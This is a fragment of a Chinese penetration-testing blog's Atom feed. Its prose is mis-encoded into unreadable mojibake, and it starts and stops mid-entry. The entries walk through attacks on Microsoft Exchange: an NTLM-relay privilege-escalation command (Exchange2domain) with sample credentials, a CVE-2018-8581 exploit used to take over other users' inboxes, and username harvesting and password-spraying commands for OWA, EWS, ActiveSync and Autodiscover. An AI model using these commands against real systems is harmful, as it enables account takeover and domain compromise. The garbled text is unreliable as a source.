alt="-w1440"></p><p><strong>å¸Œæœ›ä»¥ä¸Šå¯¹ä½ æœ‰å¸®åŠ©ã€‚</strong></p><h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><ol><li><a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">Remote NTLM relaying through meterpreter on Windows port 445</a></li><li><a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a></li><li><a href="https://www.youtube.com/watch?v=YLwJORPJ5OA" target="_blank" rel="noopener">VPN Pivoting with Cobalt Strike </a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;img src=&quot;/usr/uploads/2019/15485575598334.jpg&quot; alt=&quot;-w944&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchange Privilege Elevation</title>
    <link href="https://evi1cg.github.io/archives/Exchange_Privilege_Elevation.html"/>
    <id>https://evi1cg.github.io/archives/Exchange_Privilege_Elevation.html</id>
    <published>2019-01-23T02:42:23.000Z</published>
    <updated>2019-01-27T11:08:55.387Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15483115332981.jpg" alt=""></p><a id="more"></a><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>DC : 10.211.55.200<br>Exchange (2013):  10.211.55.201<br>Attacker: 10.211.55.2</p><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>å¾—åˆ°æŸåŸŸç”¨æˆ·ï¼›<br>ä¸ExchangeæœåŠ¡å™¨å¯äº’é€šï¼Œä¸éœ€è¦å…¥åŸŸï¼›</p><h2 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h2><p><a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">https://github.com/Ridter/Exchange2domain</a></p><h2 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h2><p>è·å–éœ€è¦çš„å‚æ•°ï¼š<br><code>-ah</code>: è‡ªå·±çš„ç›‘å¬æœåŠ¡å™¨ip<br> <code>-u</code>: å¯ç™»å½•é‚®ç®±çš„ç”¨æˆ·å<br> <code>-p</code>:å¯¹åº”è¯¥ç”¨æˆ·çš„å¯†ç <br> <code>-d</code>: åŸŸå<br><code>-th</code>:åŸŸæ§ipåœ°å€<br>è¿˜æœ‰å°±æ˜¯ExchangeæœåŠ¡å™¨åœ°å€ï¼Œé»˜è®¤ä½¿ç”¨Exchangeçš„ç‰ˆæœ¬å·ä¸ºExchange2013ï¼Œå…¶ä»–ç‰ˆæœ¬å¯ä½¿ç”¨<code>--exchange-version</code> æ¥æŒ‡å®šã€‚</p><p>Example:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Exchange2domain.py -ah <span class="number">10.211</span><span class="number">.55</span><span class="number">.2</span> -u sanfeng -p <span class="number">1</span>qaz@WSX -d cgdomain.com -th <span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> <span class="number">10.211</span><span class="number">.55</span><span class="number">.201</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15483112318745.jpg" alt=""></p><p>è·å–åˆ°hashä»¥åï¼Œå¯é€šè¿‡pash-the-hashæ¥æ‰§è¡Œå‘½ä»¤:</p><p><img src="/usr/uploads/2019/15483112364703.png" alt=""></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol><li><a href="https://github.com/dirkjanm/privexchange/" target="_blank" rel="noopener">Privexchange</a></li><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">Abusing Exchange: One API call away from Domain Admin</a></li><li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">Impacket</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15483115332981.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchangeç”¨æˆ·ä¼ªé€ (CVE-2018-8581)</title>
    <link href="https://evi1cg.github.io/archives/CVE_2018_8581.html"/>
    <id>https://evi1cg.github.io/archives/CVE_2018_8581.html</id>
    <published>2019-01-23T02:16:28.000Z</published>
    <updated>2019-01-25T00:23:13.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>DC : 192.168.31.129<br>Exchange (2013):  192.168.31.129<br>Attacker: 192.168.31.243</p><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>å¾—åˆ°ç”¨æˆ·: beiguoxia<br>ä¸ExchangeæœåŠ¡å™¨å¯äº’é€šï¼Œä¸éœ€è¦å…¥åŸŸã€‚</p><h2 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h2><p><a href="https://github.com/WyAtu/CVE-2018-8581/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-8581/</a></p><h2 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h2><p>è·å–æœ¬æœºåœ°å€ï¼š<br><img src="/usr/uploads/2019/15482101454358.jpg" alt="-w634&quot;"></p><p>ä¿®æ”¹è„šæœ¬å†…å®¹ï¼š</p><p><img src="/usr/uploads/2019/15482103139571.jpg" alt="-w709"></p><blockquote><p>ipä¸ºExchangeæœåŠ¡å™¨çš„ipåœ°å€ï¼Œå…¶ä»–çš„æ”¹æˆå¯¹åº”çš„ä¿¡æ¯,FLAGæ”¹ä¸º1ï¼Œå¢åŠ æƒé™å§”æ‰˜ã€‚</p></blockquote><p>Exploitï¼š<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-8581.</span>py</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15482104172459.jpg" alt="-w884"></p><p>æ·»åŠ æˆåŠŸä»¥åï¼Œæ‰“å¼€outlookå®¢æˆ·ç«¯ã€‚ä½¿ç”¨å·²ç»è·å–çš„é‚®ç®±è´¦å·(æ­¤å¤„ä¸ºbeiguoxia)ç™»å½•ã€‚<br><img src="/usr/uploads/2019/15482106178792.jpg" alt="-w863"></p><p>ä¾æ¬¡é€‰æ‹©åå¥½<code>è®¾ç½®-è´¦æˆ·-é«˜çº§-ä»£ç†</code>ï¼Œæ·»åŠ é™„åŠ é‚®ç®±ï¼š</p><p><img src="/usr/uploads/2019/15482108004971.jpg" alt="-w738"></p><p>æ­¤åï¼Œå¯æ¥ç®¡è¢«æ”»å‡»è´¦å·çš„æ”¶ä»¶ç®±ï¼ŒæŸ¥çœ‹æ‰€æœ‰é‚®ä»¶ï¼š</p><p><img src="/usr/uploads/2019/15482108650110.jpg" alt="-w1024"></p><p>åˆ é™¤æƒé™å§”æ‰˜:</p><p>å°†è„šæœ¬ä¸­FLAGä¿®æ”¹ä¸º0ï¼Œå†æ¬¡æ‰§è¡Œï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-8581.</span>py</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h2&gt;&lt;p&gt;DC : 192.168.31.129&lt;br&gt;Exchange (2013):  192.168.31.129&lt;br&gt;Attacker: 1
      
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchangeåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨</title>
    <link href="https://evi1cg.github.io/archives/Exchange_Hack.html"/>
    <id>https://evi1cg.github.io/archives/Exchange_Hack.html</id>
    <published>2019-01-08T19:45:00.000Z</published>
    <updated>2019-01-23T02:14:20.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Exchangeç®€ä»‹"><a href="#0x00-Exchangeç®€ä»‹" class="headerlink" title="0x00 Exchangeç®€ä»‹"></a>0x00 Exchangeç®€ä»‹</h2><p>Windows Exchange Serverï¼Œæ˜¯å›½å†…å¤–åº”ç”¨éå¸¸å¹¿æ³›çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œæ˜¯å¾®è½¯å…¬å¸çš„ä¸€å¥—ç”µå­é‚®ä»¶æœåŠ¡ç»„ä»¶ã€‚ ç®€å•è€Œè¨€ï¼ŒExchange serverå¯ä»¥è¢«ç”¨æ¥æ„æ¶åº”ç”¨äºä¼ä¸šã€å­¦æ ¡çš„é‚®ä»¶ç³»ç»Ÿã€‚æ‰€ä»¥é€šå¸¸æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ä¹Ÿä¼šå¯¹å…¶è¿›è¡Œæ”»å‡»å°è¯•ã€‚</p><h2 id="0x01-Exchange-Endpoint"><a href="#0x01-Exchange-Endpoint" class="headerlink" title="0x01  Exchange Endpoint"></a>0x01  Exchange Endpoint</h2><p>é€šå¸¸Exchange Server æœ‰ä»¥ä¸‹endpointï¼Œå³å¯è®¿é—®çš„è¿æ¥å¦‚ä¸‹ï¼š<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/AutoDiscover/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Ecp/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/EWS/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/mapi/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Microsoft-Server-ActiveSync/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OAB/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OWA/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/PowerShell/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Rpc/</span></span><br></pre></td></tr></table></figure></p><p>æ¯ä¸ªendpointçš„ä½œç”¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th>endpoint</th><th style="text-align:center">è¯´æ˜</th></tr></thead><tbody><tr><td>/autodiscover</td><td style="text-align:center">è‡ªExchange Server 2007å¼€å§‹æ¨å‡ºçš„ä¸€é¡¹è‡ªåŠ¨æœåŠ¡ï¼Œç”¨äºè‡ªåŠ¨é…ç½®ç”¨æˆ·åœ¨Outlookä¸­é‚®ç®±çš„ç›¸å…³è®¾ç½®ï¼Œç®€åŒ–ç”¨æˆ·ç™»é™†ä½¿ç”¨é‚®ç®±çš„æµç¨‹ã€‚</td></tr><tr><td>/ecp â€œExchange Control Panelâ€</td><td style="text-align:center">Exchangeç®¡ç†ä¸­å¿ƒï¼Œç®¡ç†å‘˜ç”¨äºç®¡ç†ç»„ç»‡ä¸­çš„Exchangeçš„Webæ§åˆ¶å°</td></tr><tr><td>/ews â€œExchange Web Servicesâ€</td><td style="text-align:center">Exchange Web Service,å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´åŸºäºHTTPçš„SOAPäº¤äº’</td></tr><tr><td>/mapi</td><td style="text-align:center">Outlookè¿æ¥Exchangeçš„é»˜è®¤æ–¹å¼ï¼Œåœ¨2013å’Œ2013ä¹‹åå¼€å§‹ä½¿ç”¨ï¼Œ2010 sp2åŒæ ·æ”¯æŒ</td></tr><tr><td>/Microsoft-Server-ActiveSync</td><td style="text-align:center">ç”¨äºç§»åŠ¨åº”ç”¨ç¨‹åºè®¿é—®ç”µå­é‚®ä»¶</td></tr><tr><td>/OAB â€œOffline Address Bookâ€</td><td style="text-align:center">ç”¨äºä¸ºOutlookå®¢æˆ·ç«¯æä¾›åœ°å€ç°¿çš„å‰¯æœ¬ï¼Œå‡è½»Exchangeçš„è´Ÿæ‹…</td></tr><tr><td>/owa â€œOutlook Web APPâ€</td><td style="text-align:center">Exchange owa æ¥å£ï¼Œç”¨äºé€šè¿‡webåº”ç”¨ç¨‹åºè®¿é—®é‚®ä»¶ã€æ—¥å†ã€ä»»åŠ¡å’Œè”ç³»äººç­‰</td></tr><tr><td>/powershell</td><td style="text-align:center">ç”¨äºæœåŠ¡å™¨ç®¡ç†çš„Exchangeç®¡ç†æ§åˆ¶å°</td></tr><tr><td>/RPC</td><td style="text-align:center">æ—©æœŸçš„Outlookè¿˜ä½¿ç”¨ç§°ä¸ºOutlook Anywhereçš„RPCäº¤äº’</td></tr></tbody></table><p>ä»¥ä¸Šendpointä¸­ï¼Œå¸¸ç”¨äºæš´åŠ›ç ´è§£çš„æœ‰/owa ã€/ewsã€/Microsoft-Server-ActiveSync åŠ/autodiscoverï¼Œå¦‚owaçš„æš´åŠ›ç ´è§£ï¼ˆpasswordsprayï¼‰ï¼š<br>æŠ“å–ç™»å½•åŒ…å¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg" alt="-w1118"></p><blockquote><p>ç”¨æˆ·åå¯å°è¯•ä½¿ç”¨domain\usernameã€domian.com\usernameã€username</p></blockquote><p>ä½¿ç”¨æŸå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£ï¼š</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg" alt="-w720"></p><p><code>/Microsoft-Server-ActiveSync</code> çˆ†ç ´ä¸º401è®¤è¯ï¼Œéœ€è¦å¯¹ç”¨æˆ·è´¦å·å¯†ç è¿›è¡Œbase64å¤„ç†:</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg" alt="-w647"></p><blockquote><p><code>YWRtaW46YWRtaW4=</code>  -&gt; <code>admin:admin</code></p></blockquote><p><code>/ews</code>ã€<code>/rpc</code> ç­‰å‡ ä¸ªendpointåŒæ ·ä¸º401è®¤è¯ï¼Œè´¦å·å¯†ç çš„åŠ å¯†æ–¹å¼ä¸ºNTLM Authenticateï¼š</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg" alt="-w1264"></p><p>çˆ†ç ´éœ€å¯¹è´¦å·å¯†ç è¿›è¡Œå¤„ç†ä¹‹ååœ¨è¿›è¡Œã€‚</p><h2 id="0x02-Get-UserList"><a href="#0x02-Get-UserList" class="headerlink" title="0x02 Get UserList"></a>0x02 Get UserList</h2><h3 id="éªŒè¯Exchange"><a href="#éªŒè¯Exchange" class="headerlink" title="éªŒè¯Exchange"></a>éªŒè¯Exchange</h3><p>å¯¹Exchangeçš„åˆ©ç”¨é¦–å…ˆè¦ç¡®å®šå…¶æ˜¯å¦ä½¿ç”¨äº†exchangeï¼Œå…³äºåˆ¤æ–­çš„æ–¹å¼ï¼Œæˆ‘çŸ¥é“çš„æ–¹å¼æœ‰:<br>1ã€<a href="https://github.com/vysec/checkO365" target="_blank" rel="noopener">checkO365</a></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg" alt="-w682"></p><p>2ã€owa ç™»å½•é¡µé¢ï¼Œå¦‚ï¼š<br><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg" alt=""></p><p>3ã€ç‰¹æ®ŠåŸŸåï¼š<br>è®¿é—®å¦‚ä¸‹åŸŸå<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//autodiscover.domain.com/autodiscover/autodiscover.xml</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//owa.domian/owa/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//mail.domain.com/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//webmail.domain.com/</span></span><br></pre></td></tr></table></figure></p><h3 id="è·å–ç”¨æˆ·åˆ—è¡¨"><a href="#è·å–ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="è·å–ç”¨æˆ·åˆ—è¡¨"></a>è·å–ç”¨æˆ·åˆ—è¡¨</h3><p>ä¹‹åæˆ‘ä»¬éœ€è¦è·å–å…¶è‡³å°‘ä¸€ä¸ªè´¦å·çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±éœ€è¦å–æœé›†è·å–æŸåŸŸçš„ç”¨æˆ·åˆ—è¡¨ï¼Œé™¤äº†top usernameè¿›è¡Œçˆ†ç ´ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theharvester</a>ã€<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">Mailget</a>ç­‰å·¥å…·è¿›è¡Œæœé›†ï¼Œå¦å¤–è¿˜æœ‰ä¸€ç§é€šè¿‡å»¶æ—¶æ¥åˆ¤æ–­çš„æ–¹å¼ã€‚åœ¨<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a> å†™äº†è¿™æ ·å‡ ç§æ¥åˆ¤æ–­å†…éƒ¨åŸŸå’Œå­˜åœ¨ç”¨æˆ·çš„æ–¹æ³•ï¼š</p><ul><li>Invoke-DomainHarvest</li><li>Invoke-UsernameHarvestOWA</li><li>Invoke-UsernameHarvestEAS</li></ul><p>é¦–å…ˆæ¥çœ‹Invoke-DomainHarvestï¼Œè¿™é‡Œé€šè¿‡äº†å‡ ç§æ–¹å¼æ¥è·å–å†…éƒ¨åŸŸåï¼Œæ„é€ å‚æ•°å¦‚ä¸‹ï¼š<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DomainHarvestOWA</span> <span class="selector-tag">-ExchHostname</span> <span class="selector-tag">domian</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p><p>è„šæœ¬ä¼šæ„é€ å¦‚ä¸‹url:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OWAURL</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/auth.owa"</span>)</span><br><span class="line"><span class="variable">$OWAURL2</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/"</span>)</span><br><span class="line"><span class="variable">$autodiscoverurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/autodiscover/autodiscover.xml"</span>)</span><br><span class="line"><span class="variable">$ewsurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/EWS/Exchange.asmx"</span>)</span><br></pre></td></tr></table></figure></p><p>åœ¨æœªæŒ‡å®š<code>brute</code>çš„æƒ…å†µä¸‹ï¼Œè„šæœ¬ä¼šå…ˆè¯·æ±‚<code>autodiscoverurl</code>,è‹¥å¤±è´¥ï¼Œå†è¯·æ±‚ewsurlï¼Œå¹¶é€šè¿‡è¯·æ±‚å¤´é‡Œé¢çš„NTLM Authenticateæ•°æ®æ¥çŒœæµ‹å†…éƒ¨åŸŸåï¼Œå¦‚ï¼š</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg" alt="-w1276"></p><blockquote><p>éœ€è¦æ³¨æ„åˆ°æ˜¯ï¼ŒæœªæŒ‡å®šbruteçš„æ—¶å€™éœ€è¦æ›´æ”¹-ExchHostname ä¸ºå¯¹åº”çš„autodiscoverurlåŠewsurl</p></blockquote><p>æŒ‡å®šbruteçš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šä½¿ç”¨é€šè¿‡æ—¶é—´å»¶è¿Ÿçš„æ–¹å¼æ¥æ£€æµ‹åŸŸåæ˜¯å¦å­˜åœ¨ï¼Œé¦–å…ˆä¼šæ„é€ ä¸€äº›ä¸å­˜åœ¨çš„åŸŸåŠç”¨æˆ·åè¯·æ±‚owaï¼Œå¹¶è®°å½•å…¶å“åº”æ—¶é—´ï¼Œä¹‹åä½¿ç”¨æ„é€ çš„åŸŸå­—å…¸åŠéšæœºç”¨æˆ·åæ¥è¯·æ±‚owaï¼Œæ ¹æ®å…¶å“åº”æ—¶é—´çš„ä¸åŒæ¥åˆ¤æ–­åŸŸåŠç”¨æˆ·åï¼Œåœ¨è¿™é‡Œæœ‰ä¸¤ç§bruteæ–¹å¼ï¼Œç¬¬ä¸€ç§é€šè¿‡å¯¼å…¥åŸŸååˆ—è¡¨ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p><p>ç¬¬äºŒç§é€šè¿‡å…¬å¸åç§°æ¥çŒœæµ‹ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName <span class="string">"bla bla"</span> -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p><p>è·å–åŸŸåä¹‹åï¼Œå¯å¯¼å…¥ç”¨æˆ·åè¿›è¡Œç”¨æˆ·åå­˜åœ¨æ£€æµ‹ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile owa-valid-users.txt</span><br><span class="line">Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile eas-valid-users.txt</span><br></pre></td></tr></table></figure></p><blockquote><p>PS : ä½œè€…è¯´è¿™ä¸ªé—®é¢˜æäº¤ç»™å¾®è½¯ä»¥åå¹¶æ²¡æœ‰ä¿®å¤ï¼Œä½†æ˜¯å®é™…æµ‹è¯•æ•ˆæœå¹¶ä¸å¥½ï¼Œä½†æ˜¯æ²¡å‡†ç¢°åˆ°å¯ä»¥ä½¿ç”¨çš„æƒ…å†µä¹Ÿè¯´ä¸å®šã€‚</p></blockquote><p>å½“è·å–åˆ°ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç ä¹‹åï¼Œå¯ä»¥é€šè¿‡<code>Get-GlobalAddressList</code>æ¥è·å–GlobalAddressçš„ç”¨æˆ·é‚®ç®±åœ°å€ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg" alt="-w1130"></p><h2 id="0x03-Brute-Force"><a href="#0x03-Brute-Force" class="headerlink" title="0x03 Brute Force"></a>0x03 Brute Force</h2><p>åœ¨è¿™é‡Œæš´åŠ›ç ´è§£çš„åœ°æ–¹æœ‰å¾ˆå¤šä¸ªï¼Œé¦–å…ˆå¯ä»¥é€šè¿‡burpsuiteå¯¹OWAè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¦å¤–å°±æ˜¯<code>/autodiscover</code>ã€<code>/ews</code>ã€<code>/Microsoft-Server-ActiveSync</code> ç­‰å‡ ä¸ªendpointï¼Œå¯åˆ©ç”¨çš„å·¥å…·å¦‚ï¼š<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a>ã€<a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a>ã€<a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank" rel="noopener">SprayingToolkit</a>ï¼Œå¯æ ¹æ®ä¸ªäººå–œå¥½å–èˆã€‚ä¸ºäº†é˜²æ­¢è´¦å·å› å¤šæ¬¡ç™»é™†å¤±è´¥è§¦å‘å‘Šè­¦æˆ–è´¦æˆ·è¢«å°ç¦ï¼Œå»ºè®®ä½¿ç”¨åŒå¯†ç çˆ†ç ´ç”¨æˆ·åçš„æ–¹å¼è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ä¸‹é¢ä»‹ç»ä¸€ä¸‹MailSniperçš„ç›¸å…³æ–¹æ³•çš„ä½¿ç”¨ã€‚</p><p><strong>é€šè¿‡owaçˆ†ç ´ï¼š</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg" alt="-w960"></p><p><strong>é€šè¿‡ewsçˆ†ç ´ï¼š</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg" alt="-w964"></p><p><strong>é€šè¿‡Microsoft-Server-ActiveSyncçˆ†ç ´ï¼š</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg" alt="-w898"></p><p><strong>é€šè¿‡autodiscover çˆ†ç ´ï¼š</strong><br>åœ¨MailSniperä¸­æ²¡æœ‰å†™å¯¹autodiscoverçš„çˆ†ç ´ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨burpã€ruleræˆ–è€…SprayingToolkitã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atomizer.py owa autodiscoverhost password user.txt</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg" alt="-w747"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg" alt="-w877"></p><h2 id="0x04-Search-mail"><a href="#0x04-Search-mail" class="headerlink" title="0x04 Search mail"></a>0x04 Search mail</h2><p>åœ¨è·å–åˆ°æŸç”¨æˆ·é‚®ç®±è´¦å·å¯†ç 